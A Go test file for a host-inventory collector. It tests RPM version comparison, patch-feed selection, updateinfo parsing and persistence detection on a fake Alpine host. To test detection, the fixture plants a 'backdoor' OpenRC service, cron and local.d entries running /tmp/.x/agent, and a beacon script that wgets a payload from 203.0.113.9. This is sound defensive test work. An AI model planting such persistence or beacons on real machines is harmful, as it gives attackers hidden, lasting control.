package hostenv

import (
	"context"
	"fmt"
	"io/fs"
	"reflect"
	"strings"
	"testing"
	"time"
)

func TestRPMVerCmp(t *testing.T) {
	// Cases from rpm's own test suite (rpmvercmp.at).
	for _, c := range []struct {
		a, b string
		want int
	}{
		{"1.0", "1.0", 0}, {"1.0", "2.0", -1}, {"2.0", "1.0", 1}, {"2.0.1", "2.0.1", 0}, {"2.0", "2.0.1", -1},
		{"2.0.1", "2.0", 1}, {"2.0.1a", "2.0.1a", 0}, {"2.0.1a", "2.0.1", 1}, {"2.0.1", "2.0.1a", -1},
		{"5.5p1", "5.5p1", 0}, {"5.5p1", "5.5p2", -1}, {"5.5p2", "5.5p1", 1}, {"5.5p10", "5.5p10", 0},
		{"5.5p1", "5.5p10", -1}, {"5.5p10", "5.5p1", 1}, {"10xyz", "10.1xyz", -1}, {"10.1xyz", "10xyz", 1},
		{"xyz10", "xyz10", 0}, {"xyz10", "xyz10.1", -1}, {"xyz10.1", "xyz10", 1}, {"xyz.4", "xyz.4", 0},
		{"xyz.4", "8", -1}, {"8", "xyz.4", 1}, {"xyz.4", "2", -1}, {"2", "xyz.4", 1}, {"5.5p2", "5.6p1", -1},
		{"5.6p1", "5.5p2", 1}, {"5.6p1", "6.5p1", -1}, {"6.5p1", "5.6p1", 1}, {"6.0.rc1", "6.0", 1},
		{"6.0", "6.0.rc1", -1}, {"10b2", "10a1", 1}, {"10a2", "10b2", -1}, {"1.0aa", "1.0aa", 0},
		{"1.0a", "1.0aa", -1}, {"1.0aa", "1.0a", 1}, {"10.0001", "10.0001", 0}, {"10.0001", "10.1", 0},
		{"10.1", "10.0001", 0}, {"10.0001", "10.0039", -1}, {"10.0039", "10.0001", 1}, {"4.999.9", "5.0", -1},
		{"5.0", "4.999.9", 1}, {"20101121", "20101121", 0}, {"20101121", "20101122", -1}, {"20101122", "20101121", 1},
		{"2_0", "2_0", 0}, {"2.0", "2_0", 0}, {"2_0", "2.0", 0}, {"a", "a", 0}, {"a+", "a+", 0}, {"a+", "a_", 0},
		{"a_", "a+", 0}, {"+a", "+a", 0}, {"+a", "_a", 0}, {"_a", "+a", 0}, {"+_", "+_", 0}, {"_+", "+_", 0},
		{"_+", "_+", 0}, {"+", "_", 0}, {"_", "+", 0}, {"1.0~rc1", "1.0~rc1", 0}, {"1.0~rc1", "1.0", -1},
		{"1.0", "1.0~rc1", 1}, {"1.0~rc1", "1.0~rc2", -1}, {"1.0~rc2", "1.0~rc1", 1}, {"1.0~rc1~git123", "1.0~rc1~git123", 0},
		{"1.0~rc1~git123", "1.0~rc1", -1}, {"1.0~rc1", "1.0~rc1~git123", 1}, {"1.0^", "1.0^", 0}, {"1.0^", "1.0", 1},
		{"1.0", "1.0^", -1}, {"1.0^git1", "1.0^git1", 0}, {"1.0^git1", "1.0", 1}, {"1.0", "1.0^git1", -1},
		{"1.0^git1", "1.0^git2", -1}, {"1.0^git2", "1.0^git1", 1}, {"1.0^git1", "1.01", -1}, {"1.01", "1.0^git1", 1},
		{"1.0^20160101", "1.0^20160101", 0}, {"1.0^20160101", "1.0.1", -1}, {"1.0.1", "1.0^20160101", 1},
		{"1.0^20160101^git1", "1.0^20160101^git1", 0}, {"1.0^20160102", "1.0^20160101^git1", 1},
		{"1.0^20160101^git1", "1.0^20160102", -1}, {"1.0~rc1^git1", "1.0~rc1^git1", 0}, {"1.0~rc1^git1", "1.0~rc1", 1},
		{"1.0~rc1", "1.0~rc1^git1", -1}, {"1.0^git1~pre", "1.0^git1~pre", 0}, {"1.0^git1", "1.0^git1~pre", 1},
		{"1.0^git1~pre", "1.0^git1", -1},
	} {
		if got := RPMVerCmp(c.a, c.b); got != c.want {
			t.Errorf("RPMVerCmp(%q, %q) = %d, want %d", c.a, c.b, got, c.want)
		}
	}
	if CompareEVR("1:1.0-1", "0:9.9-9") != 1 || CompareEVR("1.0-2.amzn2023", "0:1.0-10.amzn2023") != -1 || CompareEVR("0:3.0.8-1.amzn2023.0.12", "3.0.8-1.amzn2023.0.12") != 0 {
		t.Error("CompareEVR")
	}
}

func TestPatchFeedFor(t *testing.T) {
	for osr, want := range map[[3]string]PatchFeed{
		{"alpine", "3.20.3", ""}:                {Kind: "osv", Ecosystems: []string{"Alpine:v3.20"}, Upgrade: "apk upgrade", VersionFmt: "evr"},
		{"opensuse-leap", "15.6", ""}:           {Kind: "osv", Ecosystems: []string{"openSUSE:Leap 15.6"}, Upgrade: "zypper patch --category security", VersionFmt: "vr"},
		{"opensuse-tumbleweed", "20261112", ""}: {Kind: "osv", Ecosystems: []string{"openSUSE:Tumbleweed"}, Upgrade: "zypper dup", VersionFmt: "vr"},
		{"amzn", "2023", ""}:                    {Kind: "alas", Release: "2023", Upgrade: "dnf upgrade --security"},
		{"amzn", "2", ""}:                       {Kind: "alas", Release: "2", Upgrade: "yum update --security"},
		{"arch", "", ""}:                        {},
	} {
		if got := PatchFeedFor(map[string]string{"ID": osr[0], "VERSION_ID": osr[1]}); !reflect.DeepEqual(got, want) {
			t.Errorf("%v: %+v, want %+v", osr, got, want)
		}
	}
	sles := PatchFeedFor(map[string]string{"ID": "sles", "VERSION_ID": "15.5"})
	if len(sles.Ecosystems) < 5 || sles.Ecosystems[1] != "SUSE:Linux Enterprise Module for Basesystem 15 SP5" {
		t.Errorf("sles %+v", sles)
	}
	if got := PatchFeedFor(map[string]string{"ID": "sles", "VERSION_ID": "12.5"}).Ecosystems; !reflect.DeepEqual(got, []string{"SUSE:Linux Enterprise Server 12 SP5"}) {
		t.Errorf("sles 12 %v", got)
	}
	if (PatchFeed{VersionFmt: "vr"}).FeedVersion("0:3.0.8-150500.5.1") != "3.0.8-150500.5.1" || (PatchFeed{VersionFmt: "vr"}).FeedVersion("2:1.0-1") != "2:1.0-1" {
		t.Error("FeedVersion")
	}
	if ALASMirrorList("2023", RPMArch("arm64")) != "https://cdn.amazonlinux.com/al2023/core/mirrors/latest/aarch64/mirror.list" {
		t.Error("mirror list")
	}
}

func TestScanUpdateInfo(t *testing.T) {
	xml := `<?xml version="1.0" ?><updates>
<update type="security"><id>ALAS2023-2024-001</id><severity>Important</severity>
<references><reference id="CVE-2024-0001" type="cve"/><reference id="RHSA-1" type="redhat"/></references>
<pkglist><collection><package name="openssl" version="3.0.8" release="1.amzn2023.0.12" epoch="1" arch="x86_64"/>
<package name="openssl" version="3.0.8" release="1.amzn2023.0.12" epoch="1" arch="aarch64"/>
<package name="openssl-debuginfo" version="3.0.8" release="1.amzn2023.0.12" epoch="1" arch="x86_64"/></collection></pkglist></update>
<update type="bugfix"><id>ALAS2023-2024-002</id><pkglist><collection><package name="openssl" version="9" release="1" epoch="0" arch="x86_64"/></collection></pkglist></update>
<update type="security"><id>ALAS2023-2024-003</id><pkglist><collection><package name="zsh" version="5" release="1" epoch="0" arch="x86_64"/></collection></pkglist></update>
</updates>`
	var got []Advisory
	if err := ScanUpdateInfo(strings.NewReader(xml), map[string]bool{"openssl": true}, func(a Advisory) { got = append(got, a) }); err != nil {
		t.Fatal(err)
	}
	want := []Advisory{{ID: "ALAS2023-2024-001", Severity: "Important", CVEs: []string{"CVE-2024-0001"}, Fixed: map[string]string{"openssl": "1:3.0.8-1.amzn2023.0.12"}}}
	if !reflect.DeepEqual(got, want) {
		t.Errorf("got %+v", got)
	}
}

// alpineHost is an Alpine 3.20 machine as its files look: apk database
// with file lists, OpenRC, busybox crond and syslogd, no journald.
func alpineHost() *fakeHost {
	h := newFake(true)
	h.files["/etc/os-release"] = "NAME=\"Alpine Linux\"\nID=alpine\nVERSION_ID=3.20.3\nPRETTY_NAME=\"Alpine Linux v3.20\"\n"
	h.files["/etc/passwd"] = "root:x:0:0:root:/root:/bin/sh\nsshd:x:22:22:sshd:/dev/null:/sbin/nologin\n"
	h.files["/etc/group"] = "root:x:0:root\nwheel:x:10:root\n"
	h.files["/lib/apk/db/installed"] = "C:Q1a=\nP:musl\nV:1.2.5-r0\nA:aarch64\no:musl\nF:lib\nR:ld-musl-aarch64.so.1\n\n" +
		"C:Q1b=\nP:openssh-server\nV:9.7_p1-r4\nA:aarch64\no:openssh\nF:etc/init.d\nR:sshd\n\n" +
		"C:Q1c=\nP:libcrypto3\nV:3.3.2-r0\nA:aarch64\no:openssl\nF:usr/lib\nR:libcrypto.so.3\n"
	h.files["/etc/init.d/sshd"] = "#!/sbin/openrc-run\n"
	h.files["/etc/init.d/backdoor"] = "#!/sbin/openrc-run\ncommand=/tmp/.x/agent\n"
	h.files["/etc/init.d/crond"] = "#!/sbin/openrc-run\n"
	h.links["/etc/runlevels/default/sshd"] = "/etc/init.d/sshd"
	h.links["/etc/runlevels/default/backdoor"] = "/etc/init.d/backdoor"
	h.files["/etc/local.d/persist.start"] = "#!/bin/sh\n/tmp/.x/agent &\n"
	h.files["/etc/crontabs/root"] = "*/15 * * * * run-parts /etc/periodic/15min\n* * * * * /tmp/.x/agent\n"
	h.files["/etc/periodic/hourly/beacon"] = "#!/bin/sh\nwget -q http://203.0.113.9/x\n"
	ts := time.Now().Add(-time.Hour).Format("Jan _2 15:04:05")
	var log strings.Builder
	for i := 0; i < 30; i++ {
		fmt.Fprintf(&log, "%s alpine auth.info sshd[%d]: Failed password for root from 203.0.113.66 port %d ssh2\n", ts, 100+i, 4000+i)
	}
	h.files["/var/log/messages"] = log.String()
	return h
}

// statFake adds Stat (mtime now) to a fakeHost, for log windows.
type statFake struct{ *fakeHost }

func (s statFake) Stat(p string) (FileStat, error) {
	if _, ok := s.files[p]; ok {
		return FileStat{Mode: 0o644, ModTime: time.Now(), UID: 0}, nil
	}
	return FileStat{}, fs.ErrNotExist
}

func TestAlpineCollector(t *testing.T) {
	h := statFake{alpineHost()}
	h.info.RecordedAt = time.Now()
	f := Collect(context.Background(), h)
	if f.Platform.Value.Family != "alpine" || f.Packages.Value.Manager != "apk" || f.Packages.Value.Feed == nil || f.Packages.Value.Feed.Ecosystems[0] != "Alpine:v3.20" {
		t.Errorf("platform/packages %+v %+v", f.Platform.Value, f.Packages.Value.Feed)
	}
	if f.Services.Status != StatusOK || len(f.Services.Value) != 3 {
		t.Errorf("services %+v", f.Services)
	}
	got := map[string]string{}
	for _, it := range f.Persistence.Value {
		got[it.Kind+" "+it.Location] = it.Detail
	}
	if d := got["openrc /etc/init.d/backdoor"]; !strings.Contains(d, "no package installed this script") {
		t.Errorf("backdoor service not flagged: %q (%v)", d, got)
	}
	if d, ok := got["openrc /etc/init.d/sshd"]; !ok || strings.Contains(d, "no package") {
		t.Errorf("packaged sshd: %q", d)
	}
	for _, k := range []string{"local_d /etc/local.d/persist.start", "cron /etc/periodic/hourly/beacon", "cron /etc/crontabs/root"} {
		if _, ok := got[k]; !ok {
			t.Errorf("missing %s in %v", k, got)
		}
	}
	if n := f.AuthEvents.Value.FailedBySrc["203.0.113.66"]; f.AuthEvents.Status != StatusOK || n != 30 || !strings.Contains(f.AuthEvents.Detail, "unverified") {
		t.Errorf("busybox syslog sshd lines: %+v", f.AuthEvents)
	}
	// Another facility (logger -p user.info -t sshd) does not count.
	h.files["/var/log/messages"] = strings.ReplaceAll(h.files["/var/log/messages"], "auth.info", "user.info")
	if n := Collect(context.Background(), h).AuthEvents.Value.FailedBySrc["203.0.113.66"]; n != 0 {
		t.Errorf("user.info sshd lines counted: %d", n)
	}
}

func TestRPMDistros(t *testing.T) {
	rpm := "openssl\t1:3.0.8-1.amzn2023.0.11\taarch64\nbash\t0:5.2.15-1.amzn2023.0.2\taarch64\n"
	for _, c := range []struct{ osr, family, eco, kind string }{
		{"NAME=\"Amazon Linux\"\nVERSION=\"2023\"\nID=\"amzn\"\nID_LIKE=\"fedora\"\nVERSION_ID=\"2023\"\n", "rhel", "", "alas"},
		{"NAME=\"Amazon Linux\"\nVERSION=\"2\"\nID=\"amzn\"\nID_LIKE=\"centos rhel fedora\"\nVERSION_ID=\"2\"\n", "rhel", "", "alas"},
		{"NAME=\"openSUSE Leap\"\nVERSION=\"15.6\"\nID=\"opensuse-leap\"\nID_LIKE=\"suse opensuse\"\nVERSION_ID=\"15.6\"\n", "suse", "openSUSE:Leap 15.6", "osv"},
		{"NAME=\"SLES\"\nVERSION=\"15-SP5\"\nVERSION_ID=\"15.5\"\nID=\"sles\"\nID_LIKE=\"suse\"\n", "suse", "SUSE:Linux Enterprise Server 15 SP5", "osv"},
	} {
		h := newFake(true)
		h.files["/etc/os-release"] = c.osr
		h.files["/etc/passwd"] = "root:x:0:0::/root:/bin/bash\n"
		h.cmds[argvKey(rpmArgv)] = CmdResult{Stdout: []byte(rpm)}
		f := Collect(context.Background(), h)
		p := f.Packages.Value
		if f.Platform.Value.Family != c.family || p.Manager != "rpm" || len(p.Items) != 2 || p.Feed == nil || p.Feed.Kind != c.kind ||
			(c.eco != "" && p.Feed.Ecosystems[0] != c.eco) {
			t.Errorf("%s: family %q, packages %+v feed %+v", f.Platform.Value.PrettyName+f.Platform.Value.Distro, f.Platform.Value.Family, p.Manager, p.Feed)
		}
	}
}
